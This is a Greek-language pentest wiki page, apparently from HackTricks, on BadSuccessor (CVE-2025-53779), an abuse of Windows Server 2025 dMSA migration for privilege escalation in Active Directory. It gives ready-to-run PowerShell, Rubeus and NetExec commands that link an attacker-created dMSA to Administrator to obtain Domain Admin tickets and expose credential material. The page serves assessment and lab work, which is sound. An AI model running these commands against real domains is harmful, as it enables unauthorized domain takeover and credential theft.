# BadSuccessor

{{#include ../../../banners/hacktricks-training.md}}

## Επισκόπηση

Το **BadSuccessor** κάνει abuse στο workflow migration του **delegated Managed Service Account** (**dMSA**), το οποίο εισήχθη στον **Windows Server 2025**. Ένα dMSA μπορεί να συνδεθεί με έναν legacy λογαριασμό μέσω του **`msDS-ManagedAccountPrecededByLink`** και να μετακινηθεί μέσω των migration states που αποθηκεύονται στο **`msDS-DelegatedMSAState`**. Αν ένας attacker μπορεί να δημιουργήσει ένα dMSA σε ένα writable OU και να ελέγχει αυτά τα attributes, το KDC μπορεί να εκδώσει tickets για το dMSA που ελέγχει ο attacker, με το **authorization context του συνδεδεμένου λογαριασμού**.<sup>[[2]](#references)</sup>

Στην πράξη, αυτό σημαίνει ότι ένας low-privileged user που διαθέτει μόνο delegated OU rights μπορεί να δημιουργήσει ένα νέο dMSA, να το συνδέσει με τον `Administrator`, να ολοκληρώσει το migration state και στη συνέχεια να αποκτήσει ένα TGT του οποίου το PAC περιέχει privileged groups όπως οι **Domain Admins**.<sup>[[2]](#references)</sup>

## Σημαντικές λεπτομέρειες του dMSA migration

- Το dMSA είναι feature του **Windows Server 2025**.
- Το `Start-ADServiceAccountMigration` θέτει το migration στην κατάσταση **started**.
- Το `Complete-ADServiceAccountMigration` θέτει το migration στην κατάσταση **completed**.
- Το `msDS-DelegatedMSAState = 1` σημαίνει ότι το migration ξεκίνησε.
- Το `msDS-DelegatedMSAState = 2` σημαίνει ότι το migration ολοκληρώθηκε.
- Κατά τη διάρκεια ενός legitimate migration, το dMSA προορίζεται να αντικαταστήσει διαφανώς τον superseded λογαριασμό, επομένως το KDC/LSA διατηρούν την πρόσβαση που είχε ήδη ο προηγούμενος λογαριασμός.<sup>[[3]](#references)</sup>

Το Microsoft Learn σημειώνει επίσης ότι κατά τη διάρκεια του migration ο αρχικός λογαριασμός συνδέεται με το dMSA και το dMSA προορίζεται να έχει πρόσβαση σε ό,τι μπορούσε να προσπελάσει ο παλιός λογαριασμός.<sup>[[3]](#references)</sup> Αυτή είναι η security assumption που κάνει abuse το BadSuccessor.<sup>[[2]](#references)</sup>

## Απαιτήσεις

1. Ένα domain όπου υπάρχει **dMSA**, που σημαίνει ότι υπάρχει υποστήριξη **Windows Server 2025** στην πλευρά του AD.
2. Ο attacker μπορεί να **δημιουργεί** objects `msDS-DelegatedManagedServiceAccount` σε κάποιο OU ή διαθέτει ισοδύναμα broad child-object creation rights εκεί.
3. Ο attacker μπορεί να κάνει **write** στα σχετικά dMSA attributes ή να ελέγχει πλήρως το dMSA που μόλις δημιούργησε.
4. Ο attacker μπορεί να ζητά Kerberos tickets από domain-joined context ή από tunnel που φτάνει σε LDAP/Kerberos.<sup>[[2]](#references)</sup>

### Πρακτικοί έλεγχοι

Το καθαρότερο operator signal είναι να επαληθεύσετε το domain/forest level και να επιβεβαιώσετε ότι το environment χρησιμοποιεί ήδη το νέο Server 2025 stack:
```powershell
Get-ADDomain | Select Name,DomainMode
Get-ADForest | Select Name,ForestMode
```
Αν δείτε τιμές όπως `Windows2025Domain` και `Windows2025Forest`, αντιμετωπίστε το **BadSuccessor / dMSA migration abuse** ως έλεγχο προτεραιότητας.

Μπορείτε επίσης να απαριθμήσετε τα writable OUs που έχουν delegated για δημιουργία dMSA με public tooling:<sup>[[1]](#references)</sup>
```powershell
.\Get-BadSuccessorOUPermissions.ps1
```

```bash
netexec ldap <dc> -u <user> -p '<pass>' -M badsuccessor
```
## Ροή κατάχρησης

1. Create ένα dMSA σε ένα OU όπου έχετε delegated create-child rights.
2. Ορίστε το **`msDS-ManagedAccountPrecededByLink`** στο DN ενός privileged target, όπως `CN=Administrator,CN=Users,DC=corp,DC=local`.
3. Ορίστε το **`msDS-DelegatedMSAState`** σε `2`, ώστε να επισημάνετε τη migration ως completed.
4. Ζητήστε ένα TGT για το νέο dMSA και χρησιμοποιήστε το ticket που επιστράφηκε για πρόσβαση σε privileged services.<sup>[[2]](#references)</sup>

PowerShell example:<sup>[[2]](#references)</sup>
```powershell
New-ADServiceAccount -Name attacker_dMSA -DNSHostName host.corp.local -Path "OU=Delegated,DC=corp,DC=local"
Set-ADServiceAccount attacker_dMSA -Add @{
msDS-ManagedAccountPrecededByLink="CN=Administrator,CN=Users,DC=corp,DC=local"
}
Set-ADServiceAccount attacker_dMSA -Replace @{msDS-DelegatedMSAState=2}
```
Παραδείγματα αιτημάτων ticket / operational tooling:<sup>[[1]](#references)[[2]](#references)</sup>
```bash
Rubeus.exe asktgs /targetuser:attacker_dMSA$ /service:krbtgt/corp.local /dmsa /opsec /nowrap /ptt /ticket:<machine_tgt>
netexec ldap <dc> -u <user> -p '<pass>' -M badsuccessor -o TARGET_OU='OU=Delegated,DC=corp,DC=local' DMSA_NAME=attacker TARGET_ACCOUNT=Administrator
```
## Γιατί αυτό είναι κάτι περισσότερο από privilege escalation

Κατά τη νόμιμη migration, τα Windows χρειάζονται επίσης το νέο dMSA για τη διαχείριση tickets που εκδόθηκαν για τον προηγούμενο λογαριασμό πριν από το cutover. Γι' αυτό το ticket material που σχετίζεται με dMSA μπορεί να περιλαμβάνει **current** και **previous** keys στη ροή **`KERB-DMSA-KEY-PACKAGE`**.<sup>[[2]](#references)</sup>

Για μια fake migration που ελέγχεται από attacker, αυτή η συμπεριφορά μπορεί να μετατρέψει το BadSuccessor σε:<sup>[[2]](#references)</sup>

- **Privilege escalation** μέσω κληρονόμησης privileged group SIDs στο PAC.
- **Έκθεση credential material**, επειδή ο χειρισμός των previous keys μπορεί να εκθέσει material ισοδύναμο με το RC4/NT hash του predecessor σε ευάλωτα workflows.

Αυτό καθιστά την τεχνική χρήσιμη τόσο για άμεσο domain takeover όσο και για επόμενες ενέργειες, όπως pass-the-hash ή ευρύτερο credential compromise.

## Σημειώσεις σχετικά με το patch status

Η αρχική συμπεριφορά του BadSuccessor **δεν είναι απλώς ένα θεωρητικό ζήτημα του preview του 2025**. Η Microsoft του ανέθεσε το **CVE-2025-53779** και δημοσίευσε security update τον **Αύγουστο του 2025**.<sup>[[4]](#references)</sup> Διατηρήστε τεκμηριωμένο αυτό το attack για:

- **labs / CTFs / assume-breach exercises**
- **μη patched περιβάλλοντα Windows Server 2025**
- **επικύρωση των OU delegations και της έκθεσης dMSA κατά τη διάρκεια assessments**

Μην θεωρείτε ότι ένα domain Windows Server 2025 είναι ευάλωτο απλώς επειδή υπάρχει dMSA· επαληθεύστε το patch level και πραγματοποιήστε προσεκτικά tests.

## Tools

- [Akamai BadSuccessor tooling](https://github.com/akamai/BadSuccessor)
- [SharpSuccessor](https://github.com/logangoins/SharpSuccessor)
- [NetExec `badsuccessor` module](https://github.com/Pennyw0rth/NetExec/blob/main/nxc/modules/badsuccessor.py)

## References

- [1] [HTB: Eighteen - Κατάχρηση BadSuccessor dMSA για Domain Admin (0xdf)](https://0xdf.gitlab.io/2026/04/11/htb-eighteen.html)
- [2] [Akamai - BadSuccessor: Κατάχρηση του dMSA για Privilege Escalation στο Active Directory](https://www.akamai.com/blog/security-research/abusing-dmsa-for-privilege-escalation-in-active-directory)
- [3] [Microsoft Learn - Επισκόπηση των Delegated Managed Service Accounts](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/delegated-managed-service-accounts/delegated-managed-service-accounts-overview)
- [4] [Microsoft Security Response Center - CVE-2025-53779](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-53779)

{{#include ../../../banners/hacktricks-training.md}}
